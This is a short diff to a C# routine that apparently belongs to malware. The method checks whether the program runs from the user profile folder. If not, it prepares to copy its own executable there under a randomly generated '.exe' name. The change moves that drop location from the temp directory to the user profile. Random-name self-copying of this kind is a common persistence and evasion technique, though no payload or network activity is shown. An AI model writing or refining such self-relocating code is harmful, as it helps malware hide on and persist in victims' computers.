@@ -19,16 +19,15 @@ namespace Memory
         public static string Run()
         {
             Process process = Process.GetCurrentProcess();
-            string tempPath = Path.GetTempPath();
+            string tempPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             if (process.MainModule != null)
             {
-                string currentPath = Path.GetDirectoryName(process.MainModule.FileName) + @"\";
-                if (currentPath == tempPath)
+                if (Path.GetDirectoryName(process.MainModule.FileName) == tempPath)
                 {
                     return Path.GetFileNameWithoutExtension(process.MainModule.FileName);
                 }
 
-                string newExePath = tempPath + RandomStr(Rand.Next(5, 13)) + ".exe";
+                string newExePath = tempPath + @"\" + RandomStr(Rand.Next(5, 13)) + ".exe";
                 string processPath = string.Empty;
                 if (process.MainModule != null) processPath = process.MainModule.FileName;
 
